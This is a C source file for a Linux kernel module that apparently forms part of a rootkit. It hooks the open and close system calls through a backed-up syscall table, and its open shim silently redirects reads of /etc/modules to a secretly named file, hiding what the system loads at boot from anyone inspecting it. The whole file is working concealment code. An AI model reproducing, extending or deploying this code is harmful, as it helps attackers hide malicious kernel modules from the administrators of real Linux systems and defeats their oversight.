#include "include.h"
#include "rw.h"
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/path.h>
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");

int openShim(char *filename, int flags, umode_t mode) {
	int ret;
	if (!strcmp(filename, "/etc/modules")) {
		strcpy(filename, secret_modules_name);
		printk(KERN_INFO "Redirecting /etc/modules open\n");
		ret = ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
		strcpy(filename, "/etc/modules");
		return ret;
	}
	return ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
}

int closeShim(unsigned int fd) {
	//char* path = kmalloc(256, GFP_KERNEL);
	//path[255] = '\0';
	//get_path_via_fd(fd, path, 256);
	//kfree(path);
	return ((SYS_close_type)backup_sys_call_table[SYS_close])(fd);
}
